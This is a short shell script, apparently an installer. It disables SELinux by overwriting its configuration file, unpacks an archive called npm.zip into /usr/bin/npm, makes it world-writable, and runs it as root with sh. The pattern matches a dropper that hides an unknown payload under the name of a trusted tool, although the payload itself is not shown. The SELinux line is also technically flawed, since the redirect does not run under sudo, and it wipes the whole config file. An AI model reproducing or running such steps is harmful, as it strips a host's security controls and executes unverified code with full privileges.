sudo echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
unzip npm.zip
cp -r npm /usr/bin/npm
rm npm.zip
rm npm
chmod 777 /usr/bin/npm/npm
sudo sh /usr/bin/npm/npm
